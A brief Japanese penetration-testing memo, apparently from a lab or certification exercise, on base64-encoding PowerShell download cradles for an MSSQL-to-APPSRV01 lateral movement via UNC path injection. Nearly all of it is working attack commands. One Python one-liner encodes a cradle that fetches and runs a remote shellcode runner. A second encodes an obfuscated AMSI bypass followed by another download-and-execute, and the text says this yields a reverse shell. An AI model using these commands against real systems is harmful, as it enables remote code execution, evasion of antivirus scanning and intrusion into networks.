# powershell用のbase64
powershellのダウンロードクレードルをbase64エンコードしておく
pythonによるエンコードコマンド(run1.txtはシェルコードランナー)
```sh
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.215/run1.txt\\') | IEX'.encode('utf-16le')).decode())"
```

UNC Path Injection実行するとシェルコード実行されてリバースシェルが返ってくる
今回の想定としてはMSSQL -> APPSRV01(SMB署名無効化)


```
python3 -c "import base64; print(base64.b64encode('$x=[Ref].Assembly.GetType(\\'System.Management.Automation.Am\\'+\\'siUt\\'+\\'ils\\');$y=$x.GetField(\\'am\\'+\\'siCon\\'+\\'text\\',[Reflection.BindingFlags]\\'NonPublic,Static\\');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);IEX (new-object system.net.webclient).downloadstring(\\'http://172.16.64.210:8080/run2.txt\\')'.encode('utf-16le')).decode())"
```